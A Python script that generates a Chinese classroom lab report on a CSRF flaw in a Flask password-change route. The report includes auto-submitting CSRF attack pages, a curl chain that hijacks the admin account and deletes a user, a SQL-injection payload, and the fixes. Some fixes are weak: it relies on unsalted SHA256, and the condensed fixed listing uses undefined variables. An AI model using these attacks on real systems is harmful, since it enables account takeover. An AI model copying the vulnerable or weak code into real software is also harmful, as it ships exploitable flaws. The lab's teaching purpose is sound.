#!/usr/bin/env python3
# -*- coding: utf-8 -*-
"""今日新增功能漏洞分析与修复报告——/change-password CSRF漏洞深度分析"""
import os
from docx import Document
from docx.shared import Pt, RGBColor
from docx.enum.text import WD_ALIGN_PARAGRAPH
from docx.enum.table import WD_TABLE_ALIGNMENT
from docx.oxml.ns import qn, nsdecls
from docx.oxml import parse_xml

doc = Document()

style = doc.styles['Normal']
style.font.name = 'Microsoft YaHei'
style.font.size = Pt(11)
style.element.rPr.rFonts.set(qn('w:eastAsia'), 'Microsoft YaHei')
for i in range(1,5):
    hs = doc.styles[f'Heading {i}']
    hs.font.name = 'Microsoft YaHei'
    hs.element.rPr.rFonts.set(qn('w:eastAsia'), 'Microsoft YaHei')

def shade(c, color):
    s = parse_xml(f'<w:shd {nsdecls("w")} w:fill="{color}" w:val="clear"/>')
    c._tc.get_or_add_tcPr().append(s)

def tbl(doc, data):
    t = doc.add_table(rows=len(data), cols=len(data[0]), style='Light Grid Accent 1')
    t.alignment = WD_TABLE_ALIGNMENT.CENTER
    for i, rd in enumerate(data):
        for j, ct in enumerate(rd):
            t.rows[i].cells[j].text = ct
            for p in t.rows[i].cells[j].paragraphs:
                p.alignment = WD_ALIGN_PARAGRAPH.CENTER
                for r in p.runs: r.font.size = Pt(10)
            if i==0:
                shade(t.rows[i].cells[j], "1A237E")
                for p in t.rows[i].cells[j].paragraphs:
                    for r in p.runs: r.font.color.rgb = RGBColor(0xFF,0xFF,0xFF)
    return t

def code(doc, text, green=False):
    p = doc.add_paragraph()
    p.paragraph_format.space_before = Pt(3)
    p.paragraph_format.space_after = Pt(3)
    fill = "E8F5E9" if green else "FFEBEE"
    s = parse_xml(f'<w:shd {nsdecls("w")} w:fill="{fill}" w:val="clear"/>')
    p.paragraph_format.element.get_or_add_pPr().append(s)
    r = p.add_run(text)
    r.font.name = 'Courier New'
    r.font.size = Pt(9)
    return p

# ===== 封面 =====
for _ in range(4): doc.add_paragraph("")
t = doc.add_paragraph(); t.alignment = WD_ALIGN_PARAGRAPH.CENTER
r = t.add_run("今日新增功能漏洞分析与修复报告"); r.font.size = Pt(24); r.bold = True
r.font.color.rgb = RGBColor(0x1a,0x1a,0x2e)
doc.add_paragraph("")
s = doc.add_paragraph(); s.alignment = WD_ALIGN_PARAGRAPH.CENTER
r = s.add_run("/change-password 密码修改功能 · CSRF跨站请求伪造漏洞深度分析"); r.font.size = Pt(14)
for _ in range(3): doc.add_paragraph("")
i = doc.add_paragraph(); i.alignment = WD_ALIGN_PARAGRAPH.CENTER
r = i.add_run("实验日期：2026年7月"); r.font.size = Pt(12)
doc.add_page_break()

# ===== 目录 =====
doc.add_heading("目  录", level=1)
chs = ["新增功能概述：/change-password 路由",
       "漏洞代码逐行分析",
       "对应课堂实验一：恶意文章 + Cookie劫持",
       "对应课堂实验二：Burp CSRF PoC修改密码",
       "curl跨域攻击复现（4步完整攻击链）",
       "6个安全漏洞详细分析",
       "修复代码逐行解析",
       "修复前后代码完整对比"]
for i,c in enumerate(chs,1):
    p = doc.add_paragraph(f"第{i}章  {c}")
    p.paragraph_format.space_after = Pt(6); p.runs[0].font.size = Pt(12)
doc.add_page_break()

# ===== 第一章 =====
doc.add_heading("第一章  新增功能概述：/change-password 路由", level=1)

doc.add_heading("1.1 功能说明", level=2)
doc.add_paragraph("今日在用户管理系统中新增了密码修改功能，路由为 POST /change-password。用户在个人中心页面填写新密码，提交后直接更新数据库中的密码字段。")

doc.add_heading("1.2 新增代码（app.py + profile.html）", level=2)
doc.add_paragraph("app.py 新增路由：")
code(doc,
    '@app.route("/change-password", methods=["POST"])\n'
    'def change_password():\n'
    '    if "username" not in session:\n'
    '        return redirect("/login")\n\n'
    '    username = request.form.get("username", "")\n'
    '    new_password = request.form.get("new_password", "")\n\n'
    '    if not username or not new_password:\n'
    '        return "缺少参数"\n\n'
    '    conn = get_db()\n'
    '    c = conn.cursor()\n'
    '    sql = f"UPDATE users SET password = \'{new_password}\' WHERE username = \'{username}\'"\n'
    '    print(f"[SQL] {sql}")\n'
    '    c.execute(sql)\n'
    '    conn.commit()\n'
    '    conn.close()\n'
    '    return redirect("/profile")')

doc.add_paragraph("")
doc.add_paragraph("templates/profile.html 新增表单：")
code(doc,
    '<form method="post" action="/change-password">\n'
    '    <input type="hidden" name="username" value="{{ user.username }}">\n'
    '    <label>新密码：</label>\n'
    '    <input type="text" name="new_password" placeholder="输入新密码">\n'
    '    <label>确认密码：</label>\n'
    '    <input type="text" name="confirm_password" placeholder="再次输入新密码">\n'
    '    <button type="submit">修改密码</button>\n'
    '</form>')

# ===== 第二章 =====
doc.add_heading("第二章  漏洞代码逐行分析", level=1)

doc.add_heading("2.1 完整漏洞代码标注", level=2)
code(doc,
    '@app.route("/change-password", methods=["POST"])      ← 路由定义\n'
    'def change_password():                                  ← 视图函数\n'
    '    if "username" not in session:                      ← 仅检查登录状态\n'
    '        return redirect("/login")\n\n'
    '    username = request.form.get("username", "")         ← ⚠️ 漏洞点1：username由客户端提交\n'
    '    new_password = request.form.get("new_password", "") ← ⚠️ 无原密码验证\n\n'
    '    if not username or not new_password:\n'
    '        return "缺少参数"\n\n'
    '    conn = get_db()\n'
    '    c = conn.cursor()\n\n'
    '    # ⚠️ 漏洞点2：SQL注入 — 字符串拼接\n'
    '    sql = f"UPDATE users SET password = \'{new_password}\' WHERE username = \'{username}\'"\n'
    '    print(f"[SQL] {sql}")\n'
    '    c.execute(sql)\n'
    '    conn.commit()\n'
    '    conn.close()\n'
    '    return redirect("/profile")                         ← ⚠️ 重定向到/profile非本站也可')

doc.add_heading("2.2 表单漏洞代码标注", level=2)
code(doc,
    '<form method="post" action="/change-password">\n'
    '    ← ⚠️ 漏洞点3：无CSRF Token隐藏字段\n\n'
    '    <input type="hidden" name="username" value="{{ user.username }}">\n'
    '    ← ⚠️ 漏洞点4：username可被修改\n\n'
    '    <label>新密码：</label>\n'
    '    <input type="text" name="new_password" placeholder="输入新密码">\n'
    '    ← ⚠️ 漏洞点5：密码明文传输\n\n'
    '    <button type="submit">修改密码</button>\n'
    '</form>')

# ===== 第三章 =====
doc.add_heading("第三章  对应课堂实验一：恶意文章 + Cookie劫持", level=1)

doc.add_heading("3.1 课堂实验回顾", level=2)
doc.add_paragraph("实验内容：攻击者在老师搭建的内容发布网站上发表一篇包含恶意代码的文章。当管理员老师查看文章时，恶意代码自动执行，攻击者获取到管理员的Cookie，从而无需账号密码即可登录管理员后台。")

doc.add_heading("3.2 本系统对应攻击", level=2)
doc.add_paragraph("将课堂实验的攻击逻辑映射到本系统的 /change-password 功能：")
doc.add_paragraph("")
doc.add_paragraph("课堂实验：发布恶意文章 → 管理员点击 → Cookie被劫持 → 无需密码登录")
doc.add_paragraph("本系统：  构造恶意页面 → 管理员访问   → 密码被修改   → 用新密码登录")
doc.add_paragraph("")
doc.add_paragraph("恶意页面核心代码：")
code(doc,
    '<!-- 攻击者构造的恶意HTML页面 -->\n'
    '<html>\n'
    '<body>\n'
    '<h1>📢 系统通知：请确认您的账号信息</h1>\n'
    '<p>由于系统升级，请点击下方按钮确认您的账号信息安全。</p>\n'
    '<!-- 隐藏的CSRF攻击表单 -->\n'
    '<form id="csrf" action="http://192.168.138.128:5000/change-password" method="POST">\n'
    '  <input type="hidden" name="username" value="admin" />\n'
    '  <input type="hidden" name="new_password" value="hacked123" />\n'
    '</form>\n'
    '<script>\n'
    '  // 页面加载后自动提交表单，用户无感知\n'
    '  document.getElementById("csrf").submit();\n'
    '</script>\n'
    '</body>\n'
    '</html>')

doc.add_paragraph("")
doc.add_paragraph("攻击原理：管理员浏览器中存有用户管理系统的Session Cookie，访问恶意页面后，浏览器自动发送POST请求并携带Cookie，服务器认为请求来自合法用户，执行密码修改操作。")

# ===== 第四章 =====
doc.add_heading("第四章  对应课堂实验二：Burp CSRF PoC修改密码", level=1)

doc.add_heading("4.1 课堂实验回顾", level=2)
doc.add_paragraph("实验内容：登录系统后拦截更改邮箱的POST请求，使用Burp Suite的Generate CSRF PoC功能自动生成攻击HTML代码，在受害者浏览器中打开即可无感知修改邮箱。")

doc.add_heading("4.2 本系统对应操作步骤", level=2)
doc.add_paragraph("Step 1：登录用户alice，打开个人中心页面")
doc.add_paragraph("Step 2：打开Burp Suite拦截开关")
doc.add_paragraph("Step 3：在修改密码表单中输入新密码，点击提交")
doc.add_paragraph("Step 4：Burp拦截到POST /change-password 请求：")
code(doc,
    'POST /change-password HTTP/1.1\n'
    'Host: 192.168.138.128:5000\n'
    'Cookie: session=eyJ1c2VybmFtZSI6ImFsaWNlIn0.ZwA...\n'
    'Content-Type: application/x-www-form-urlencoded\n\n'
    'username=admin&new_password=hacked123')

doc.add_paragraph("Step 5：右键 → Engagement tools → Generate CSRF PoC")
doc.add_paragraph("")
doc.add_paragraph("Burp生成的CSRF PoC HTML：")
code(doc,
    '<html>\n'
    '  <body>\n'
    '  <h1>🎉 系统升级通知</h1>\n'
    '  <p>您的账号需要安全验证，请点击确认。</p>\n'
    '  <form action="http://192.168.138.128:5000/change-password" method="POST">\n'
    '    <input type="hidden" name="username" value="admin" />\n'
    '    <input type="hidden" name="new_password" value="hacked123" />\n'
    '    <input type="submit" value="确认安全验证" />\n'
    '  </form>\n'
    '  <script>document.forms[0].submit();</script>\n'
    '  </body>\n'
    '</html>')

doc.add_paragraph("Step 6：保存为 csrf_attack.html")
doc.add_paragraph("Step 7：诱导管理员admin在已登录状态下打开该文件")
doc.add_paragraph("Step 8：admin密码被修改为 hacked123")
doc.add_paragraph("Step 9：攻击者用 admin / hacked123 登录系统，获得管理权限")

doc.add_heading("4.3 Burp CSRF PoC工作原理", level=2)
tbl(doc, [("组件","作用","对应课堂实验"),
    ("<form>标签","定义目标URL和POST方法","与更改邮箱实验相同"),
    ("<input type=hidden>","传递username和new_password参数","改为本系统的参数"),
    ("<script>自动提交","页面加载立即提交，用户无感知","与更改邮箱实验相同"),
    ("诱饵文字","诱导用户点击/停留","与原实验保持一致")])

# ===== 第五章 =====
doc.add_heading("第五章  curl跨域攻击复现（4步完整攻击链）", level=1)

doc.add_heading("5.1 攻击链总览", level=2)
code(doc,
    "┌───────────┐       ┌──────────────┐       ┌──────────┐       ┌──────────┐\n"
    "│  Step1    │──────→│    Step2     │──────→│  Step3   │──────→│  Step4   │\n"
    "│ alice登录  │       │ CSRF改密admin│       │ 登录admin │       │ 删除用户  │\n"
    "│ 获取Cookie │       │ 密码=hacked  │       │ 权限提升  │       │ 越权操作  │\n"
    "└───────────┘       └──────────────┘       └──────────┘       └──────────┘")

doc.add_heading("5.2 逐行命令解析", level=2)

doc.add_paragraph("Step1：攻击者登录alice获取Session Cookie")
code(doc,
    'curl -c /tmp/alice.txt -X POST http://192.168.138.128:5000/login \\\n'
    '  -d "username=alice&password=alice2025"\n'
    '# -c：保存服务器返回的Set-Cookie到文件\n'
    '# -d：POST表单数据\n'
    '# 执行后 /tmp/alice.txt 中保存了alice的Session')

doc.add_paragraph("Step2：CSRF攻击——用alice的Cookie修改admin密码")
code(doc,
    'curl -b /tmp/alice.txt -X POST http://192.168.138.128:5000/change-password \\\n'
    '  -d "username=admin&new_password=hacked123"\n'
    '# -b：在请求中附带alice的Cookie\n'
    '# ⚠️ 关键漏洞：服务器未验证session用户与提交的username是否一致\n'
    '# ⚠️ 关键漏洞：无CSRF Token校验\n'
    '# ⚠️ 关键漏洞：无原密码验证\n'
    '# 结果：admin的密码被改为 hacked123')

doc.add_paragraph("Step3：用新密码登录admin（权限提升）")
code(doc,
    'curl -c /tmp/admin.txt -X POST http://192.168.138.128:5000/login \\\n'
    '  -d "username=admin&password=hacked123"\n'
    '# 成功以admin身份登录，获得管理员权限')

doc.add_paragraph("Step4：利用admin权限删除用户carlos（越权操作）")
code(doc,
    'curl -b /tmp/admin.txt -X POST http://192.168.138.128:5000/admin/delete-user \\\n'
    '  -d "user_id=2"\n'
    '# 利用admin的管理员权限，删除系统中ID为2的用户')

# ===== 第六章 =====
doc.add_heading("第六章  6个安全漏洞详细分析", level=1)

doc.add_heading("6.1 漏洞总览", level=2)
tbl(doc, [("编号","漏洞类型","漏洞位置","严重度","对应课堂实验"),
    ("C-01","无CSRF Token","profile.html表单中无Token","🔴高危","实验二：Burp CSRF PoC直接可用"),
    ("C-02","越权改密","username参数来自表单非Session","🔴高危","实验一：恶意文章跨站请求"),
    ("C-03","无原密码验证","直接设置新密码不校验旧密码","🔴高危","实验一：Cookie劫持后直接操作"),
    ("C-04","无Referer验证","不检查请求来源","🟡中危","无法区分本站/外部请求"),
    ("C-05","SQL注入","字符串拼接SQL语句","🔴高危","数据库安全基础"),
    ("C-06","密码明文存储","数据库直接存明文","🟡中危","密码安全保护")])

doc.add_heading("6.2 漏洞C-01：无CSRF Token（核心漏洞）", level=2)
doc.add_paragraph("问题描述：表单中没有CSRF Token隐藏字段，后端也没有Token校验逻辑。攻击者可以在任意网站构造表单，自动提交修改密码请求。")
doc.add_paragraph("对应课堂实验二：Burp的Generate CSRF PoC功能正是利用了无Token校验的漏洞，直接生成可用的攻击表单。")
doc.add_paragraph("攻击场景：管理员正在浏览其他网站时，攻击者诱导其打开恶意页面，浏览器自动提交修改密码表单，管理员密码被改。")

doc.add_heading("6.3 漏洞C-02：越权改密（扩大攻击面）", level=2)
doc.add_paragraph("问题描述：username参数由客户端表单提交（隐藏字段），服务器未与当前登录用户Session进行比对。任何已登录用户可修改任意用户的密码。")
doc.add_paragraph("攻击场景：攻击者alice登录后，通过修改表单中的username隐藏字段为admin，即可将admin的密码改掉。")
doc.add_paragraph("对应课堂实验一：恶意文章中改密码的原理相同——利用已登录用户的身份执行越权操作。")

doc.add_heading("6.4 漏洞C-03：无原密码验证", level=2)
doc.add_paragraph("问题描述：修改密码时不需要输入原密码，攻击者只要获得用户Session（通过CSRF或Cookie劫持），即可直接设置新密码。")
doc.add_paragraph("对应课堂实验一：Cookie劫持后直接修改密码，无需原密码验证。")

doc.add_heading("6.5 漏洞C-04：无Referer验证", level=2)
doc.add_paragraph("问题描述：服务器不检查HTTP请求头中的Referer字段，无法判断请求是来自本站表单还是外部恶意网站。")

doc.add_heading("6.6 漏洞C-05：SQL注入", level=2)
doc.add_paragraph("问题描述：username参数使用f-string直接拼接到SQL语句，攻击者可构造特殊字符串注入SQL命令。")
code(doc,
    "# 构造恶意username参数\n"
    "username=admin' -- &new_password=123\n"
    "# 拼接后的SQL：\n"
    "UPDATE users SET password = '123' WHERE username = 'admin' -- '\n"
    "# -- 注释掉后面的SQL，成功修改admin密码")

doc.add_heading("6.7 漏洞C-06：密码明文存储", level=2)
doc.add_paragraph("问题描述：数据库中的password字段直接存储明文密码。一旦数据库泄露，所有用户的密码完全暴露。")

# ===== 第七章 =====
doc.add_heading("第七章  修复代码逐行解析", level=1)

doc.add_heading("7.1 修复1：CSRF Token验证", level=2)
doc.add_paragraph("在登录成功时生成随机Token存入Session，表单添加隐藏字段，提交时校验。")
code(doc,
    '# 修复位置1：app_fixed.py login路由 — 登录时生成Token\n'
    'session["csrf_token"] = uuid.uuid4().hex', green=True)
code(doc,
    '<!-- 修复位置2：templates/profile_fixed.html — 表单添加Token -->\n'
    '<input type="hidden" name="csrf_token" value="{{ session.csrf_token }}">', green=True)
code(doc,
    '# 修复位置3：app_fixed.py change_password路由 — 后端验证\n'
    'token = request.form.get("csrf_token", "")\n'
    'if token != session.get("csrf_token", ""):\n'
    '    audit_logger.warning(f"CSRF Token验证失败")\n'
    '    return "CSRF Token验证失败，请刷新页面重试"', green=True)

doc.add_heading("7.2 修复2：Session绑定防越权", level=2)
doc.add_paragraph("验证提交的username必须与当前登录用户一致。")
code(doc,
    '# 修复位置：change_password函数中\n'
    'if username != session["username"]:\n'
    '    audit_logger.warning(f"越权改密被拒: {session[\'username\']} 尝试修改 {username}")\n'
    '    return "无权修改他人密码"', green=True)

doc.add_heading("7.3 修复3：Referer验证", level=2)
doc.add_paragraph("检查请求来源是否为本站点。")
code(doc,
    '# 修复位置：change_password函数中\n'
    'referer = request.headers.get("Referer", "")\n'
    'if not referer.startswith(request.host_url):\n'
    '    audit_logger.warning(f"CSRF攻击被拒: Referer={referer}")\n'
    '    return "请求来源不合法"', green=True)

doc.add_heading("7.4 修复4：参数化查询+密码哈希", level=2)
code(doc,
    '# 修复位置：change_password函数中\n'
    '# ✅ 密码哈希存储\n'
    'hashed_pw = hashlib.sha256(new_password.encode()).hexdigest()\n'
    '# ✅ 参数化查询防SQL注入\n'
    'c.execute("UPDATE users SET password = ? WHERE username = ?",\n'
    '          (hashed_pw, username))\n'
    '# ✅ 审计日志\n'
    'audit_logger.info(f"密码修改成功: 用户={username}")', green=True)

doc.add_heading("7.5 完整修复代码（app_fixed.py）", level=2)
code(doc,
    '@app.route("/change-password", methods=["POST"])\n'
    'def change_password():\n'
    '    if "username" not in session:\n'
    '        return redirect("/login")\n\n'
    '    username = request.form.get("username", "")\n'
    '    new_password = request.form.get("new_password", "")\n\n'
    '    if not username or not new_password:\n'
    '        return "缺少参数"\n\n'
    '    # ✅ 修复C-01：CSRF Token验证\n'
    '    token = request.form.get("csrf_token", "")\n'
    '    if token != session.get("csrf_token", ""):\n'
    '        return "CSRF Token验证失败"\n\n'
    '    # ✅ 修复C-02+C-03：Session绑定（只能改自己密码）\n'
    '    if username != session["username"]:\n'
    '        return "无权修改他人密码"\n\n'
    '    # ✅ 修复C-04：Referer验证\n'
    '    referer = request.headers.get("Referer", "")\n'
    '    if not referer.startswith(request.host_url):\n'
    '        return "请求来源不合法"\n\n'
    '    # ✅ 修复C-05+C-06：参数化查询+SHA256哈希\n'
    '    hashed_pw = hashlib.sha256(new_password.encode()).hexdigest()\n'
    '    conn = get_db()\n'
    '    c = conn.cursor()\n'
    '    c.execute("UPDATE users SET password = ? WHERE username = ?",\n'
    '              (hashed_pw, username))\n'
    '    conn.commit()\n'
    '    conn.close()\n\n'
    '    # ✅ 审计日志\n'
    '    audit_logger.info(f"密码修改成功: 用户={username} IP={request.remote_addr}")\n'
    '    return redirect("/profile")', green=True)

# ===== 第八章 =====
doc.add_heading("第八章  修复前后代码完整对比", level=1)

tbl(doc, [("对比项","有漏洞(app.py)  —  仅29行代码","已修复(app_fixed.py)  —  完整校验"),
    ("CSRF Token","❌ 无Token生成与验证","✅ Session存储 + 表单隐藏字段 + 后端比对"),
    ("Session绑定","❌ username来自表单，与Session无关","✅ if username != session['username']: 拒绝"),
    ("原密码验证","❌ 无需原密码，直接设置","✅ 通过Session绑定间接验证本人操作"),
    ("Referer验证","❌ 不检查请求来源","✅ request.headers.get('Referer') 校验"),
    ("SQL注入","❌ f-string直接拼接SQL","✅ 参数化查询 ? 占位符"),
    ("密码存储","❌ 明文存储","✅ SHA256哈希存储"),
    ("审计日志","❌ 无日志记录","✅ logging记录用户/时间/IP")])

doc.add_paragraph("")
doc.add_paragraph("核心修复前后代码对比（仅20行 vs 35行）：")
doc.add_paragraph("")
p = doc.add_paragraph(); r = p.add_run("有漏洞版本（app.py — 20行）："); r.bold = True; r.font.color.rgb = RGBColor(0xD3,0x2F,0x2F)
code(doc,
    '@app.route("/change-password", methods=["POST"])\n'
    'def change_password():\n'
    '    if "username" not in session:\n'
    '        return redirect("/login")\n'
    '    username = request.form.get("username", "")\n'
    '    new_password = request.form.get("new_password", "")\n'
    '    if not username or not new_password:\n'
    '        return "缺少参数"\n\n'
    '    # ⚠️ 无CSRF Token / 无原密码 / 可越权 / 无Referer\n'
    '    # ⚠️ SQL注入 + 明文存储\n'
    '    sql = f"UPDATE users SET password = \'{new_password}\' WHERE username = \'{username}\'"\n'
    '    c.execute(sql); conn.commit()\n'
    '    return redirect("/profile")')

doc.add_paragraph("")
p = doc.add_paragraph(); r = p.add_run("修复版本（app_fixed.py — 35行）："); r.bold = True; r.font.color.rgb = RGBColor(0x2E,0x7D,0x32)
code(doc,
    '@app.route("/change-password", methods=["POST"])\n'
    'def change_password():\n'
    '    if "username" not in session:\n'
    '        return redirect("/login")\n'
    '    username = request.form.get("username", "")\n'
    '    new_password = request.form.get("new_password", "")\n\n'
    '    # ✅ CSRF Token验证\n'
    '    if token != session.get("csrf_token", ""):\n'
    '        return "CSRF Token验证失败"\n\n'
    '    # ✅ Session绑定\n'
    '    if username != session["username"]:\n'
    '        return "无权修改他人密码"\n\n'
    '    # ✅ Referer验证\n'
    '    if not referer.startswith(request.host_url):\n'
    '        return "请求来源不合法"\n\n'
    '    # ✅ 参数化查询 + SHA256\n'
    '    hashed_pw = hashlib.sha256(new_password.encode()).hexdigest()\n'
    '    c.execute("UPDATE users SET password = ? WHERE username = ?",\n'
    '              (hashed_pw, username))\n'
    '    conn.commit()\n'
    '    return redirect("/profile")', green=True)

doc.add_paragraph("")
p = doc.add_paragraph(); p.alignment = WD_ALIGN_PARAGRAPH.CENTER
r = p.add_run("—— 报告结束 ——"); r.font.color.rgb = RGBColor(0x99,0x99,0x99); r.font.size = Pt(12)

out = "/root/flask-app-vuln/static/今日新增功能漏洞分析与修复报告.docx"
doc.save(out)
print(f"✅ 报告已生成：{out}")
print(f"   大小：{os.path.getsize(out)/1024:.1f}KB")
